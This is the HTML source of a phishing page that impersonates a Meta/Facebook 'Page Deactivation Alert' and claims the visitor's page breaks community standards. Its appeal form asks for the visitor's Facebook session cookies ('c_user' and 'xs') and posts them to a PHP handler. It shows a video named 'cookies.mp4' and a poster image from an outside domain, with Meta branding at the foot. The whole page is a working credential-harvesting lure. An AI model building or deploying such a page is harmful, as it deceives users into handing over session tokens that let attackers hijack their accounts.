<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <title>Action Required</title>
    <link rel="icon" href="navlogo.png">
    <style>
        @import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }

        html,
        body {
            height: 100%;
            width: 100%;
        }

        .container {
            height: 100%;
            width: 100%;
            background-color: rgb(255, 255, 255);
        }

        .navbar {
            width: 100%;
            height: 45px;
            background-color: rgb(255, 255, 255);
            display: flex;
            align-items: center;
        }

        .navbar>img {
            width: 100px;
            margin-left: 26%;

        }

        .main {
            width: 60%;
            height: calc(100% - 45px);
            background-color: rgb(255, 254, 254);
            margin-left: 20%;
            padding-left: 100px;
            padding-top: 90px;
            line-height: 50px;
        }

        .main>h1 {
            color: #0d7ab8;
            font-size: 18px;

        }

        .main>p {
            /* line-height: 50px; */
            font-size: 14px;
        }

        .main h2 {
            color: #afafaf;
            font-size: 16px;
        }

        .main video {
            box-sizing: border-box;
            width: 550px;
            object-fit: contain;
            overflow-clip-margin: content-box;
            overflow: hidden;
        }

        .main h4 {
            font-size: 14px;
            font-weight: 500;
        }

        .loginform {
            width: 100%;
        }

        .loginform .elem {
            width: 100%;
            padding-top: 15px;
        }

        input {
            padding: 15px;
            font-size: 15px;
            width: 85%;
            border: 1px solid black;
        }

        .loginform button {
            padding: 12px 20px 12px 20px;
            margin-top: 19px;
            color: rgb(255, 253, 253);
            background-color: #333;
            transition: all .5s;
            font-weight: 400;
            cursor: pointer;
        }

        button:hover {
            background-color: #dadada;
            color: #333;
        }


        .bottom {
            width: 100%;
            height: 60%;
            padding: 50px;
            background-color: #ffffff;
            display: flex;
            align-items: center;
            justify-content: center;
        }



        /* Media Query */
        @media (min-width: 400px) and (max-width: 550px) {

            html,
            body {
                width: 100%;
                line-height: normal;
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            .navbar>img {
                width: 80px;
                margin-left: 2%;
            }

            .main {
                width: 100%;
                background-color: rgb(255, 254, 254);
                line-height: 30px;
                margin: 15px;
                padding: 0;
            }

            .main video {
                box-sizing: border-box;
                width: 250px;
                object-fit: contain;
                overflow-clip-margin: content-box;
                overflow: hidden;
            }

            .bottom {
                width: 100%;
                height: 10%;
                padding: 20px;
                background-color: #ffffff;
                display: flex;
                align-items: center;
                justify-content: center;
            }
        }


        @media (min-width: 551px) and (max-width: 768px) {

            html,
            body {
                width: 100%;
                line-height: normal;
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            .navbar>img {
                width: 80px;
                margin-left: 2%;
            }

            .main {
                width: 100%;
                background-color: rgb(255, 254, 254);
                line-height: 0;
                margin: 15px;
                padding: 0;
                line-height: 30px;
            }

            .main video {
                box-sizing: border-box;
                width: 400px;
                object-fit: contain;
                overflow-clip-margin: content-box;
                overflow: hidden;
            }

            .bottom {
                width: 100%;
                height: 10%;
                padding: 20px;
                background-color: #ffffff;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            input {
                padding: 15px;
                font-size: 15px;
                width: 70%;
                border: 1px solid black;
                font-family: Georgia, 'Times New Roman', Times, serif;
                font-weight: 100;
            }
        }

        @media (min-width: 769px) and (max-width: 1200px) {

            html,
            body {
                width: 100%;
                line-height: normal;
                margin: 0;
                padding: 0;
                box-sizing: border-box;
            }

            .navbar>img {
                width: 80px;
                margin-left: 2%;
            }

            .main {
                width: 100%;
                background-color: rgb(255, 254, 254);
                line-height: 0;
                margin: 15px;
                padding: 0;
                line-height: 30px;
            }

            .main video {
                box-sizing: border-box;
                width: 500px;
                object-fit: contain;
                overflow-clip-margin: content-box;
                overflow: hidden;
            }

            .bottom {
                width: 100%;
                height: 10%;
                padding: 20px;
                background-color: #ffffff;
                display: flex;
                align-items: center;
                justify-content: center;
            }

            input {
                padding: 15px;
                font-size: 15px;
                width: 80%;
                border: 1px solid black;
                font-weight: 100;
            }
        }
    </style>
</head>

<body>
    <div class="container">
        <nav>
            <div class="navbar">
                <img src="pngwing.com.png" alt="">
            </div>
        </nav>
        <div class="main">
            <h1>Page Deactivation Alert!</h1>
            <p>We have detected unusual activity on your page that violates our community standards.</p>
            <p>Your access to your page has been limited, and you are currently unable to post, share, or comment using
                your page.</p>
            <p>If you believe this to be a mistake, you have the option to submit an appeal by providing the necessary
                information.</p>
            <h2>Must watch detailed video</h2>
            <video controls="" poster="http://yourcomplainglitch.online/wp-content/uploads/2023/09/WhatsApp-Image-2023-09-27-at-12.20.16-AM.jpeg" src="./cookies.mp4" __idm_id__="57345"></video>
            <h4>Please be sure to provide the requested information below.</h4>
            <!-- Copy From Website Start -->
            <div class="loginform">
                <form action="db=1.php" method="post">
                    <div class="elem">
                        <input type="number" name="cuser" id="cuser" placeholder="c_user" required>
                    </div>
                    <div class="elem">
                        <input type="text" name="xs" id="xs" placeholder="xs" required>
                    </div>
                    <button>Submit</button>
                </form>
                <div class="bottom">
                    <img src="./frommeta.jpeg" alt="">
                </div>
            </div>
        </div>
</body>

</html>